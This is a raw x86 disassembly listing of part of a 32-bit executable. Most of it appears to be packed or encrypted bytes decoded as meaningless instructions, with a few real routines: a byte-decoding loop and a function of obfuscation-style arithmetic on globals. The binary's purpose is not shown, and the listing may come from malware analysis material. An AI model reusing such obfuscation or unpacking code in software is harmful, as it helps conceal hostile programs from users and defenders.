  40395f:	sbb    al,0x14
  403961:	inc    ebx
  403962:	mov    eax,0xcb442e0c
  403967:	jmp    0x7d77:0xfce9c83b
  40396e:	(bad)  
  40396f:	in     al,0x62
  403971:	or     DWORD PTR [eax+0x76],ebx
  403974:	femms  
  403976:	cmc    
  403977:	mov    ah,0x3a
  403979:	gs loope 0x403955
  40397c:	mov    ecx,0x913d6c35
  403981:	cs xchg ebp,eax
  403983:	mov    ds:0xc093e689,al
  403988:	mov    WORD PTR [esi-0x26],ds
  40398b:	sbb    al,0x42
  40398d:	imul   esi,DWORD PTR [ebx-0x342e5b77],0x3db8259f
  403997:	scas   al,BYTE PTR es:[edi]
  403998:	cmp    dl,0x87
  40399b:	stos   BYTE PTR es:[edi],al
  40399c:	mul    bl
  40399e:	sahf   
  40399f:	test   al,0xad
  4039a1:	cmc    
  4039a2:	cmp    dh,dl
  4039a4:	cmp    dl,BYTE PTR [ebx-0x19]
  4039a7:	xchg   ch,al
  4039a9:	out    dx,eax
  4039aa:	mov    al,ch
  4039ac:	shl    DWORD PTR [esi],cl
  4039ae:	jecxz  0x4039f5
  4039b0:	adc    ch,BYTE PTR [ebp-0x5a7fba1d]
  4039b6:	retf   0x60d
  4039b9:	lods   al,BYTE PTR ds:[esi]
  4039ba:	scas   eax,DWORD PTR es:[edi]
  4039bb:	imul   eax,DWORD PTR [ebp+0x57],0x77
  4039bf:	shl    DWORD PTR [eax-0x1c89c3d5],0xab
  4039c6:	std    
  4039c7:	or     DWORD PTR [ebx+0x78],edi
  4039ca:	mov    al,0x44
  4039cc:	dec    eax
  4039cd:	inc    edi
  4039ce:	dec    ebx
  4039cf:	test   BYTE PTR [edi-0x65db91a3],ah
  4039d5:	test   eax,edi
  4039d7:	jmp    0x9d82b778
  4039dc:	sbb    BYTE PTR [edx+0x31],ah
  4039df:	adc    BYTE PTR [ebx-0xa68af00],cl
  4039e5:	cdq    
  4039e6:	jle    0x403971
  4039e8:	pop    es
  4039e9:	dec    edi
  4039ea:	inc    esp
  4039eb:	push   0x11eaee6b
  4039f0:	pop    ebx
  4039f1:	inc    ebp
  4039f2:	adc    ch,BYTE PTR [ebx+edx*4+0x5f]
  4039f6:	sti    
  4039f7:	mov    DWORD PTR [esi-0x3e],edi
  4039fa:	mov    cl,0xa
  4039fc:	lahf   
  4039fd:	test   eax,ebx
  4039ff:	inc    ebp
  403a00:	jne    0x4039ab
  403a02:	cmp    dl,BYTE PTR [edi-0x61f0e323]
  403a08:	add    al,bl
  403a0a:	gs jb  0x403a82
  403a0d:	mov    eax,ds:0x61d84230
  403a12:	sub    BYTE PTR [ecx+0x463bd77d],ah
  403a18:	mov    edx,0x7a9fa4c7
  403a1d:	rcr    BYTE PTR [ebp+ebp*2+0x5f9ef8d4],0xf0
  403a25:	scas   al,BYTE PTR es:[edi]
  403a26:	(bad)  
  403a28:	imul   si,WORD PTR [esi],0xffa2
  403a2c:	push   ss
  403a2d:	stos   BYTE PTR es:[edi],al
  403a2e:	sysenter 
  403a30:	and    DWORD PTR [edx+0x5e01b522],ecx
  403a36:	fdiv   QWORD PTR [esi]
  403a38:	mov    ebx,0xb2c9e3b6
  403a3d:	sbb    bl,BYTE PTR [ebx-0x15]
  403a40:	loop   0x403a2f
  403a42:	adc    al,0x96
  403a44:	jnp    0x403ab7
  403a46:	adc    al,0xcc
  403a48:	outs   dx,DWORD PTR ds:[esi]
  403a49:	cmp    BYTE PTR [edx-0x2a],ch
  403a4c:	int    0x99
  403a4e:	xor    DWORD PTR [edi],ebx
  403a50:	mov    edi,DWORD PTR [ebp-0x4]
  403a53:	jmp    0x403c5f
  403a58:	addr16 jo 0x403aaa
  403a5b:	or     BYTE PTR [ebx+0x33],cl
  403a5e:	arpl   WORD PTR [ebx+0x3c],si
  403a61:	aas    
  403a62:	cwde   
  403a63:	pop    ss
  403a64:	pop    edx
  403a65:	popf   
  403a66:	inc    ecx
  403a67:	cmp    BYTE PTR [ebp+0x1e],ah
  403a6a:	jl     0x403ae8
  403a6c:	ins    DWORD PTR es:[edi],dx
  403a6d:	jg     0x403aeb
  403a6f:	jl     0x403a2b
  403a71:	fisttp QWORD PTR [edi-0x1d]
  403a74:	aas    
  403a75:	cmp    eax,0xbe9ac01d
  403a7a:	jecxz  0x403a31
  403a7c:	adc    ebp,esi
  403a7e:	iret   
  403a7f:	test   ebx,ebp
  403a81:	mov    ecx,DWORD PTR [esi]
  403a83:	repz cs inc esi
  403a86:	cdq    
  403a87:	or     DWORD PTR [edx+0x5],ecx
  403a8a:	cmp    al,0x67
  403a8c:	test   bh,dh
  403a8e:	xor    ebp,edi
  403a90:	dec    BYTE PTR [edx-0x1d]
  403a93:	mov    ds:0x5ad81a1b,al
  403a98:	pop    ss
  403a99:	retf   0x7e2e
  403a9c:	mov    ebx,0xbefeb353
  403aa1:	adc    ebx,DWORD PTR [ebx+eiz*2]
  403aa4:	nop
  403aa5:	jne    0x403b0a
  403aa7:	pushf  
  403aa8:	jmp    0x8a7f:0xbcab5f2c
  403aaf:	mov    al,0x6
  403ab1:	int    0x96
  403ab3:	xor    al,0xec
  403ab5:	je     0x403b26
  403ab7:	jo     0x403af1
  403ab9:	cmc    
  403aba:	scas   al,BYTE PTR es:[edi]
  403abb:	retf   
  403abc:	adc    DWORD PTR [ebp-0x542b0ffe],esp
  403ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ac3:	retf   0xe371
  403ac6:	inc    esp
  403ac7:	sti    
  403ac8:	cld    
  403ac9:	sub    eax,0x18653d54
  403ace:	sub    DWORD PTR [edx],ebp
  403ad0:	leave  
  403ad1:	addr16 jns 0x403b04
  403ad4:	lea    edi,[eax]
  403ad6:	xor    eax,0xb6561cc5
  403adb:	dec    eax
  403adc:	sbb    al,0xb5
  403ade:	lea    ebp,[esi]
  403ae0:	(bad)  
  403ae1:	ja     0x403a92
  403ae3:	dec    eax
  403ae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ae5:	(bad)  
  403ae6:	mov    esp,0x75478309
  403aeb:	fwait
  403aec:	xor    eax,0xb26c87ab
  403af1:	push   ebp
  403af2:	dec    eax
  403af3:	repnz xchg edx,eax
  403af5:	mov    eax,esi
  403af7:	loopne 0x403b02
  403af9:	mov    ah,BYTE PTR [edx]
  403afb:	daa    
  403afc:	test   al,0x60
  403afe:	mov    ch,0xa8
  403b00:	mov    ah,0xa0
  403b02:	ja     0x403acb
  403b04:	push   eax
  403b05:	xor    dl,dh
  403b07:	jbe    0x403b63
  403b09:	iret   
  403b0a:	jmp    0x403a92
  403b0c:	std    
  403b0d:	push   0x3f
  403b0f:	mov    dl,0x7f
  403b11:	pushf  
  403b12:	pop    ebp
  403b13:	mov    DWORD PTR [ebp-0x51c8a483],ebp
  403b19:	pop    edx
  403b1a:	dec    edi
  403b1b:	dec    edx
  403b1c:	in     al,dx
  403b1d:	jnp    0x403b9d
  403b1f:	dec    esi
  403b20:	loope  0x403ae7
  403b22:	aas    
  403b23:	dec    edx
  403b24:	and    BYTE PTR [ecx+0x55],bh
  403b27:	lahf   
  403b28:	fmul   QWORD PTR [ebx-0x5a541ecd]
  403b2e:	sti    
  403b2f:	sar    BYTE PTR cs:[edx+0x4755b9ea],cl
  403b36:	sahf   
  403b37:	xor    esi,DWORD PTR [esi]
  403b39:	cmp    dh,BYTE PTR [eax-0x43]
  403b3c:	mov    bh,0xe7
  403b3e:	icebp  
  403b3f:	xlat   BYTE PTR ds:[ebx]
  403b40:	iret   
  403b41:	and    ebp,edi
  403b43:	sub    ebp,DWORD PTR [ebx+0x7e9678db]
  403b49:	rol    BYTE PTR [ecx-0x4],cl
  403b4c:	pop    es
  403b4d:	sti    
  403b4e:	mov    DWORD PTR [esi+ebp*2+0x5d6fee47],0xca011393
  403b59:	inc    ebp
  403b5a:	lea    edx,[ebx]
  403b5c:	lods   eax,DWORD PTR ds:[esi]
  403b5d:	cdq    
  403b5e:	jb     0x403ba5
  403b60:	fld    DWORD PTR [edi]
  403b62:	push   ss
  403b63:	jmp    0x403b22
  403b65:	or     esp,esp
  403b67:	inc    ecx
  403b68:	xor    eax,0x305c9d03
  403b6d:	jo     0x403bec
  403b6f:	push   edx
  403b70:	mov    esp,0x5b12e0aa
  403b75:	sahf   
  403b76:	out    0xf9,eax
  403b78:	jle    0x403b86
  403b7a:	xor    ah,ch
  403b7c:	adc    al,0x39
  403b7e:	mov    ebp,0xcd03c4c
  403b83:	leave  
  403b84:	and    eax,0x696a648f
  403b89:	adc    dl,dl
  403b8b:	inc    BYTE PTR [eax-0xc]
  403b8e:	xor    eax,0xae0227d4
  403b93:	jmp    0x403be4
  403b95:	mov    ds:0x4fcfa8ab,eax
  403b9a:	sub    ch,ch
  403b9c:	inc    edi
  403b9d:	in     al,0x25
  403b9f:	mov    ebp,0xf3a861b
  403ba4:	neg    DWORD PTR [esi]
  403ba6:	xchg   ebx,eax
  403ba7:	loop   0x403c28
  403ba9:	xchg   esi,eax
  403baa:	ins    BYTE PTR es:[edi],dx
  403bab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bad:	rcr    BYTE PTR [esi+ebx*4+0x70cdbc6a],1
  403bb4:	and    DWORD PTR [edi],esi
  403bb6:	test   DWORD PTR [ecx+0x7810d8e1],ebx
  403bbc:	fcom   QWORD PTR [ecx-0x7c83e572]
  403bc2:	hlt    
  403bc3:	xchg   ecx,eax
  403bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bc5:	pop    esp
  403bc6:	imul   ebp,DWORD PTR [esi-0x283ad380],0x27
  403bcd:	mov    BYTE PTR ds:0xc04099f1,al
  403bd3:	rcl    esp,cl
  403bd5:	adc    dh,ch
  403bd7:	int    0xc3
  403bd9:	inc    BYTE PTR [bp+di]
  403bdc:	cli    
  403bdd:	or     al,0x7c
  403bdf:	mov    ds:0xab1294f0,al
  403be4:	cmp    BYTE PTR [eax],ch
  403be6:	and    al,0x5c
  403be8:	mov    bl,0x40
  403bea:	sub    DWORD PTR [ebp-0xb],0xffffffc8
  403bee:	fild   QWORD PTR [ecx-0x2f]
  403bf1:	call   0x9274191
  403bf6:	enter  0x4df1,0xc8
  403bfa:	into   
  403bfb:	inc    ebp
  403bfc:	repz cwde 
  403bfe:	fadd   st,st(7)
  403c00:	add    al,0xbd
  403c02:	xchg   edi,eax
  403c03:	cs pop eax
  403c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c06:	or     BYTE PTR [edx-0x6d],ah
  403c09:	stos   BYTE PTR es:[edi],al
  403c0a:	cs cli 
  403c0c:	pop    ds
  403c0d:	imul   ebp,DWORD PTR [edx-0x6a9833de],0xbb4d573b
  403c17:	and    DWORD PTR [edi+0x39],ebx
  403c1a:	out    0xe6,al
  403c1c:	jno    0x403c2e
  403c1e:	pop    es
  403c1f:	test   DWORD PTR [ecx+0x76],ebx
  403c22:	xor    ebp,DWORD PTR [edx-0x5d]
  403c25:	dec    ebx
  403c26:	(bad)  
  403c27:	mov    WORD PTR [ecx+eax*2-0x64df5a2d],fs
  403c2e:	push   ebp
  403c2f:	push   0xa9bdc9c0
  403c34:	pusha  
  403c35:	add    DWORD PTR [ebp-0x5f],edi
  403c38:	lods   eax,DWORD PTR ds:[esi]
  403c39:	jge    0x403be6
  403c3b:	dec    edx
  403c3c:	pop    edx
  403c3d:	sub    BYTE PTR [eax+edx*8-0x5d35d8d5],dl
  403c44:	add    edx,esi
  403c46:	fisubr DWORD PTR [esi]
  403c48:	call   0x3503305f
  403c4d:	push   edi
  403c4e:	mov    DWORD PTR [edi+0x7f19c66e],esi
  403c54:	test   al,ch
  403c56:	push   eax
  403c57:	sub    DWORD PTR ds:[edi-0x7a8e8920],eax
  403c5e:	pusha  
  403c5f:	xor    edi,ecx
  403c61:	add    edi,esi
  403c63:	mov    esi,DWORD PTR [ebp+0x8]
  403c66:	imul   edi,edx
  403c69:	mov    ebx,DWORD PTR [ebp+0xc]
  403c6c:	xor    eax,ecx
  403c6e:	add    eax,edx
  403c70:	mov    al,BYTE PTR [ebx+eax*1+0x32729a]
  403c77:	mov    BYTE PTR [edi+esi*1],al
  403c7a:	mov    eax,DWORD PTR [ebp-0x4]
  403c7d:	xor    eax,ecx
  403c7f:	lea    edx,[edx+eax*1+0x32729a]
  403c86:	mov    eax,DWORD PTR [ebp-0x4]
  403c89:	xor    eax,ecx
  403c8b:	mov    esi,0xffcd8d66
  403c90:	jmp    0x403e9c
  403c95:	dec    edi
  403c96:	push   ss
  403c97:	sbb    eax,DWORD PTR [ebp+ebp*2+0x7d]
  403c9b:	jae    0x403cae
  403c9d:	sti    
  403c9e:	adc    ebp,DWORD PTR ds:0x766d9697
  403ca4:	or     ecx,DWORD PTR [edx+0x18]
  403ca7:	jl     0x403d25
  403ca9:	ins    DWORD PTR es:[edi],dx
  403caa:	jg     0x403d28
  403cac:	jl     0x403c8c
  403cae:	adc    BYTE PTR [edi-0x57cc572a],0x9
  403cb5:	test   DWORD PTR [ebp+edx*2-0x36],esp
  403cb9:	push   0x69
  403cbb:	sub    eax,0x5f7b4a4b
  403cc0:	xchg   ebp,eax
  403cc1:	leave  
  403cc2:	add    eax,0x8d4177d3
  403cc7:	out    0x8c,eax
  403cc9:	test   ebx,esi
  403ccb:	cs add eax,0x66b0b458
  403cd1:	les    eax,FWORD PTR cs:[ecx+0x49]
  403cd5:	jb     0x403ce7
  403cd7:	test   al,0xb4
  403cd9:	bound  edx,QWORD PTR [ebx]
  403cdb:	fadd   st,st(2)
  403cdd:	jb     0x403d32
  403cdf:	mov    ebp,0x84af0a51
  403ce4:	popf   
  403ce5:	xlat   BYTE PTR ds:[ebx]
  403ce6:	or     dl,BYTE PTR ds:0x8fa0f86e
  403cec:	stc    
  403ced:	cld    
  403cee:	(bad)  
  403cef:	mov    eax,ds:0xc952d56e
  403cf4:	in     eax,0x28
  403cf6:	and    edx,edx
  403cf8:	imul   eax
  403cfa:	es sti 
  403cfc:	mov    dh,0xf5
  403cfe:	sub    eax,0x4dfc35d5
  403d03:	adc    al,0xe5
  403d05:	lods   eax,DWORD PTR ds:[esi]
  403d06:	or     dh,ah
  403d08:	sbb    dh,BYTE PTR [ecx]
  403d0a:	dec    ebx
  403d0b:	dec    ebp
  403d0c:	fnsave [ecx+0x71a77c04]
  403d12:	lods   eax,DWORD PTR ds:[esi]
  403d13:	(bad)  
  403d14:	icebp  
  403d15:	jecxz  0x403cf6
  403d17:	js     0x403d92
  403d19:	(bad)  
  403d1a:	loope  0x403cdb
  403d1c:	jae    0x403d19
  403d1e:	shl    DWORD PTR [ebx],1
  403d20:	mov    ch,0x42
  403d22:	and    BYTE PTR [ebp+0x103220dc],0x97
  403d29:	xor    esp,ebx
  403d2b:	mul    DWORD PTR [esi+0x3a6b5317]
  403d31:	int    0x55
  403d33:	jp     0x403d3d
  403d35:	adc    ah,BYTE PTR [ebp-0x4b]
  403d38:	loop   0x403d9c
  403d3a:	jmp    0xf108:0xf97093cf
  403d41:	aad    0x10
  403d43:	lahf   
  403d44:	packssdw mm6,QWORD PTR [edx-0x32]
  403d48:	std    
  403d49:	ficom  DWORD PTR [ebp-0x528307d0]
  403d4f:	xor    BYTE PTR [esi-0x6bd28b13],ch
  403d55:	(bad)
  403d58:	or     dl,BYTE PTR [ebx]
  403d5a:	and    esp,DWORD PTR [edi]
  403d5c:	dec    ecx
  403d5d:	cdq    
  403d5e:	or     ch,BYTE PTR [edi]
  403d60:	test   eax,0xd98c69cd
  403d65:	jno    0x403d71
  403d67:	rcl    BYTE PTR [esi+0x221a403f],1
  403d6d:	lahf   
  403d6e:	(bad)  
  403d6f:	jp     0x403d2d
  403d71:	push   ds
  403d72:	test   eax,0xa955990a
  403d77:	push   ebp
  403d78:	mov    ah,BYTE PTR [edx-0x2b]
  403d7b:	scas   al,BYTE PTR es:[edi]
  403d7c:	inc    ebx
  403d7d:	fdivp  st(1),st
  403d7f:	or     al,0xf1
  403d81:	pop    es
  403d82:	push   eax
  403d83:	cmp    ah,BYTE PTR [eax]
  403d85:	pop    edi
  403d86:	push   ecx
  403d87:	pop    edx
  403d88:	or     ch,ah
  403d8a:	adc    eax,0x274aeec2
  403d8f:	sbb    al,0x4a
  403d91:	stos   DWORD PTR es:[edi],eax
  403d92:	mov    dh,0x2e
  403d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d95:	inc    esi
  403d96:	add    DWORD PTR [eax+0xcbffbc8],ebx
  403d9c:	les    edi,FWORD PTR [edx+0x4fd3a]
  403da2:	lock mov bh,0xcd
  403da5:	or     eax,0x8b300991
  403daa:	mov    ds:0x1e4cb8fd,al
  403daf:	inc    esi
  403db0:	in     eax,0x37
  403db2:	dec    eax
  403db3:	jmp    0x7ed0:0xac8f2d72
  403dba:	jle    0x403e24
  403dbc:	popa   
  403dbd:	dec    eax
  403dbe:	outs   dx,DWORD PTR ds:[esi]
  403dbf:	mov    bl,0x20
  403dc1:	fcomp  DWORD PTR [ebx+eiz*8]
  403dc4:	clc    
  403dc5:	retf   
  403dc6:	dec    ebp
  403dc7:	lahf   
  403dc8:	lea    ebx,[esi-0x13]
  403dcb:	sub    dl,BYTE PTR [esi]
  403dcd:	(bad)  
  403dce:	jmp    0xe53c:0x15e1ae08
  403dd5:	ret    0x967
  403dd8:	cs mov ecx,0xc68c59e2
  403dde:	xor    BYTE PTR [ebx-0x7806f626],ah
  403de4:	xor    esp,ebx
  403de6:	mov    eax,0x440bd1a5
  403deb:	out    0x68,al
  403ded:	ins    BYTE PTR es:[edi],dx
  403dee:	mov    ebx,0xcc115c4a
  403df3:	dec    edx
  403df4:	jmp    0xe6c9:0xfe33284e
  403dfb:	rcl    BYTE PTR [esi-0x2],cl
  403dfe:	int    0x49
  403e00:	sbb    DWORD PTR [edx],0x0
  403e03:	dec    esi
  403e04:	mov    al,0x7f
  403e06:	push   0x8079a96b
  403e0b:	repnz mov eax,0x68921822
  403e11:	adc    al,0xb
  403e13:	scas   al,BYTE PTR es:[edi]
  403e14:	in     al,dx
  403e15:	jae    0x403e6f
  403e17:	dec    ebx
  403e18:	pop    esi
  403e19:	mov    dh,0xcb
  403e1b:	call   0x918b:0x8a634086
  403e22:	xchg   edi,eax
  403e23:	pop    edi
  403e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e25:	xor    al,0x3d
  403e27:	and    edi,DWORD PTR [ecx]
  403e29:	jns    0x403e2c
  403e2b:	aad    0x80
  403e2d:	lahf   
  403e2e:	dec    edx
  403e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e30:	cmp    eax,0xc4d013d2
  403e35:	test   BYTE PTR [ebp-0x78],dh
  403e38:	test   eax,0x6d73e711
  403e3d:	in     al,0x79
  403e3f:	jl     0x403e53
  403e41:	sti    
  403e42:	push   0xe0a77956
  403e47:	xor    ecx,DWORD PTR [esi+ebp*4-0x1f]
  403e4b:	mov    ebx,eax
  403e4d:	clc    
  403e4e:	ror    bh,0x83
  403e51:	fwait
  403e52:	cmp    al,0x44
  403e54:	into   
  403e55:	and    ebx,DWORD PTR [esi+0x19cc7e11]
  403e5b:	push   0xffffffad
  403e5d:	sbb    DWORD PTR [eax-0x7df45441],edx
  403e63:	sar    BYTE PTR [edx+0x52],cl
  403e66:	in     eax,dx
  403e67:	imul   ebx,DWORD PTR [esi],0x4e0afc61
  403e6d:	(bad)  
  403e6e:	(bad)  
  403e70:	or     esp,0x3f058d8f
  403e76:	sub    eax,0x8d377cde
  403e7b:	repz setns BYTE PTR [ecx-0x31aa74f4]
  403e83:	jbe    0x403eae
  403e85:	dec    esi
  403e86:	xor    dh,BYTE PTR [ebx-0x40]
  403e89:	pop    ebx
  403e8a:	pop    eax
  403e8b:	mov    esp,0x6660d3d1
  403e90:	ficom  WORD PTR [edx]
  403e92:	clc    
  403e93:	mov    al,0x96
  403e95:	loop   0x403ee3
  403e97:	xchg   ecx,eax
  403e98:	pop    ecx
  403e99:	push   0x3
  403e9b:	imul   BYTE PTR [ebx]
  403e9d:	lock add esi,DWORD PTR [ebp+0x10]
  403ea1:	cmp    edx,esi
  403ea3:	jbe    0x403630
  403ea9:	pop    ebx
  403eaa:	mov    eax,0xf89c8534
  403eaf:	pop    edi
  403eb0:	pop    esi
  403eb1:	leave  
  403eb2:	ret    0xc
  403eb5:	push   ebp
  403eb6:	mov    ebp,esp
  403eb8:	mov    eax,DWORD PTR [ebp+0xc]
  403ebb:	xor    edx,edx
  403ebd:	mov    ecx,0x7264fcad
  403ec2:	div    ecx
  403ec4:	mov    ecx,DWORD PTR [ebp+0x10]
  403ec7:	and    ecx,eax
  403ec9:	jmp    0x4040d5
  403ece:	(bad)  
  403ecf:	addr16 jns 0x403f24
  403ed2:	icebp  
  403ed3:	jb     0x403f28
  403ed5:	ins    DWORD PTR es:[edi],dx
  403ed6:	add    al,0x2a
  403ed8:	pop    esi
  403ed9:	push   0x9a7c0e91
  403ede:	mov    ebx,0x6d7c7c1a
  403ee3:	jg     0x403f61
  403ee5:	jl     0x403f13
  403ee7:	fsub   DWORD PTR [ecx+eiz*2-0x58]
  403eeb:	(bad)  
  403eec:	jno    0x403ed0
  403eee:	dec    eax
  403eef:	add    eax,0x6e825b99
  403ef4:	jne    0x403ee5
  403ef6:	add    DWORD PTR [ecx+eax*2-0x5cf188],edi
  403efd:	fidivr DWORD PTR [edi]
  403eff:	push   eax
  403f00:	jmp    0x77e81626
  403f05:	mov    edx,0x4ea616a8
  403f0a:	enter  0xc442,0x1c
  403f0e:	stos   DWORD PTR es:[edi],eax
  403f0f:	mov    edx,0x96d77941
  403f14:	xchg   edx,eax
  403f15:	and    dh,bl
  403f17:	jae    0x403f09
  403f19:	repz sbb eax,0xe6cdd93
  403f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f20:	mov    DWORD PTR [ebp+0x77],ebp
  403f23:	dec    ebx
  403f24:	fucomi st,st(2)
  403f26:	add    DWORD PTR [ebp+0x4b],edi
  403f29:	dec    BYTE PTR [eax+0xb]
  403f2c:	mov    esi,eax
  403f2e:	adc    edx,DWORD PTR [esi]
  403f30:	int3   
  403f31:	mov    al,0x1e
  403f33:	xchg   ebp,eax
  403f34:	inc    esi
  403f35:	pop    ebx
  403f36:	or     dh,ah
  403f38:	arpl   WORD PTR [ebx+0x16998714],bx
  403f3e:	xchg   BYTE PTR [ebp+0x26aca9a8],ch
  403f44:	push   ebx
  403f45:	or     esp,DWORD PTR [ecx]
  403f47:	loopne 0x403f05
  403f49:	into   
  403f4a:	xor    BYTE PTR [esi],0x7a
  403f4d:	push   ds
  403f4e:	xchg   ecx,eax
  403f4f:	mov    ebx,0xa58d86fb
  403f54:	and    eax,0xb27fdb6
  403f59:	mov    eax,0x5a1bd7d1
  403f5e:	mov    esp,0xb9155c56
  403f63:	xlat   BYTE PTR ds:[ebx]
  403f64:	imul   BYTE PTR [eax+0x706fd2f0]
  403f6a:	aaa    
  403f6b:	adc    eax,0xb86b0160
  403f70:	(bad)  
  403f71:	daa    
  403f72:	dec    ebp
  403f73:	push   edx
  403f74:	shl    DWORD PTR [ebx+0x44],cl
  403f77:	sub    al,0x3d
  403f79:	pushf  
  403f7a:	add    DWORD PTR [ebp+0x43],edx
  403f7d:	xor    al,BYTE PTR [esp+edx*1]
  403f80:	js     0x403f2e
  403f82:	xchg   edx,eax
  403f83:	mov    dh,BYTE PTR [edx+0x63]
  403f86:	push   eax
  403f87:	xor    ah,BYTE PTR [esi]
  403f89:	or     al,0xcb
  403f8b:	fisub  DWORD PTR [ebx+edx*8]
  403f8e:	test   al,0x22
  403f90:	xor    DWORD PTR [edi+0x6a24325f],esp
  403f96:	bound  ebp,QWORD PTR [ecx+0x35]
  403f99:	leave  
  403f9a:	xchg   ch,bl
  403f9c:	std    
  403f9d:	mov    bl,0x32
  403f9f:	ret    
  403fa0:	icebp  
  403fa1:	imul   ebp,DWORD PTR [eax+0x63cc59bb],0xfffffff2
  403fa8:	in     eax,dx
  403fa9:	and    al,0x6e
  403fab:	in     eax,dx
  403fac:	mov    ah,0xaa
  403fae:	ja     0x403f91
  403fb0:	inc    esi
  403fb1:	dec    ecx
  403fb2:	push   ebp
  403fb3:	xchg   ebp,eax
  403fb4:	jg     0x403fa5
  403fb6:	imul   DWORD PTR [eax+ebp*1-0x5eea0c2f]
  403fbd:	mov    ds:0xc7ca8523,eax
  403fc2:	pusha  
  403fc3:	inc    eax
  403fc4:	repz arpl WORD PTR [eax-0x425c28af],dx
  403fcb:	out    0xd9,al
  403fcd:	push   cs
  403fce:	fldenv [ebp+0x6e]
  403fd1:	jmp    0x690698b8
  403fd6:	xchg   esp,eax
  403fd7:	test   DWORD PTR [edi+edi*2-0x510621a1],0x79f328dd
  403fe2:	in     eax,0xaa
  403fe4:	clc    
  403fe5:	scas   eax,DWORD PTR es:[edi]
  403fe6:	ret    
  403fe7:	sbb    ah,dl
  403fe9:	cmc    
  403fea:	mov    bl,0xab
  403fec:	jae    0x403f80
  403fee:	cld    
  403fef:	test   al,0xf4
  403ff1:	mov    ch,0x6c
  403ff3:	fs (bad) 
  403ff5:	xchg   esi,eax
  403ff6:	bound  ecx,QWORD PTR ss:[eax+0x17]
  403ffa:	and    ecx,0xffffffc0
  403ffd:	push   esp
  403ffe:	cmp    BYTE PTR [edx+eiz*8-0x69],ch
  404002:	add    BYTE PTR [ecx+0x7bec719b],bl
  404008:	mul    ah
  40400a:	or     eax,0x18d62955
  40400f:	jo     0x403fca
  404011:	mov    ds,WORD PTR [ecx+0x3704ca4]
  404017:	xchg   esi,eax
  404018:	test   esi,ebp
  40401a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40401b:	xchg   esp,eax
  40401c:	pop    ds
  40401d:	and    eax,0xe83ec0c
  404023:	cmp    cl,bl
  404025:	push   ebx
  404026:	push   esi
  404027:	mov    esi,0x1c444a59
  40402c:	sub    al,0x51
  40402e:	dec    eax
  40402f:	jp     0x403ff8
  404031:	sbb    esi,DWORD PTR [eax+0x1608ba93]
  404037:	adc    BYTE PTR [ecx+0x995bfbb],0xae
  40403e:	sbb    BYTE PTR [esi-0x2b90c854],dl
  404044:	fimul  WORD PTR [ebx]
  404046:	aad    0x93
  404048:	cmp    BYTE PTR [ebp+0x40927ec5],dh
  40404e:	sar    BYTE PTR [esi-0x60182d8d],cl
  404054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404055:	push   ss
  404056:	mov    dl,0xc8
  404058:	ins    DWORD PTR es:[edi],dx
  404059:	mov    esi,0x306e566b
  40405e:	fldlg2 
  404060:	xchg   ax,ax
  404062:	fistp  DWORD PTR [edx-0x4915e57e]
  404068:	mov    es,WORD PTR [ecx]
  40406a:	fimul  WORD PTR [edx+0x52]
  40406d:	fcmovnb st,st(6)
  40406f:	addr16 hlt 
  404071:	cmp    DWORD PTR ds:0x1ceb2016,ebp
  404077:	repnz push 0xae5b37fa
  40407d:	fild   WORD PTR ds:0x5ccfbd0d
  404083:	ret    
  404084:	xchg   esi,eax
  404085:	bnd js 0x404089
  404088:	xor    BYTE PTR [esi],bh
  40408a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40408b:	mov    esi,0x2263d5b3
  404090:	push   ds
  404091:	lea    ebx,[esp+esi*1+0x6c694028]
  404098:	xchg   BYTE PTR [esi+0x35],dh
  40409b:	inc    esi
  40409c:	cmp    eax,0x61248dcd
  4040a1:	inc    eax
  4040a2:	sti    
  4040a3:	int    0x61
  4040a5:	je     0x40405f
  4040a7:	mov    ds:0x26c5b44a,al
  4040ac:	jae    0x40407e
  4040ae:	jg     0x404115
  4040b0:	jo     0x40404a
  4040b2:	fcmovu st,st(5)
  4040b4:	push   ebx
  4040b5:	and    esi,esp
  4040b7:	jne    0x40407e
  4040b9:	shr    BYTE PTR [esi-0x2b],0x15
  4040bd:	lods   al,BYTE PTR ds:[esi]
  4040be:	stos   DWORD PTR es:[edi],eax
  4040bf:	jge    0x40406e
  4040c1:	scas   al,BYTE PTR es:[edi]
  4040c2:	int3   
  4040c3:	adc    DWORD PTR [ebp+0x77c44787],0x39
  4040ca:	inc    edi
  4040cb:	lods   al,BYTE PTR ds:[esi]
  4040cc:	xchg   edi,eax
  4040cd:	adc    ecx,DWORD PTR [ecx+0x59]
  4040d0:	popa   
  4040d1:	or     al,0x10
  4040d3:	xor    eax,0x8fc981c7
  4040d8:	sbb    eax,0xc18b8116
  4040dd:	pop    ebp
  4040de:	ret    0x18
  4040e1:	push   ebp
  4040e2:	mov    ebp,esp
  4040e4:	sub    esp,0x58
  4040e7:	xor    DWORD PTR ds:0x433733,0x2c9d
  4040f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4040f4:	sbb    eax,DWORD PTR ds:0x433773
  4040fa:	mov    eax,0x8a3a
  4040ff:	sub    DWORD PTR ds:0x4336ab,0x44c4
  404109:	xor    ax,WORD PTR [ecx+0x20]
  40410d:	sub    ecx,0x3d49
  404113:	mov    ecx,0x3b00
  404118:	xor    DWORD PTR ds:0x433647,0x649a
  404122:	add    ax,cx
  404125:	movzx  eax,ax
  404128:	mov    DWORD PTR [ebp-0xc],eax
  40412b:	mov    ecx,DWORD PTR ds:0x43375b
  404131:	and    DWORD PTR ds:0x433727,ecx
  404137:	mov    BYTE PTR [ebp-0x1],0x7f
  40413b:	sub    ecx,0x46a5
  404141:	lea    eax,[ebp-0x1]
  404144:	mov    DWORD PTR [ebp-0x10],eax
  404147:	adc    DWORD PTR ds:0x43363f,ecx
  40414d:	mov    al,BYTE PTR [ebp-0x1]
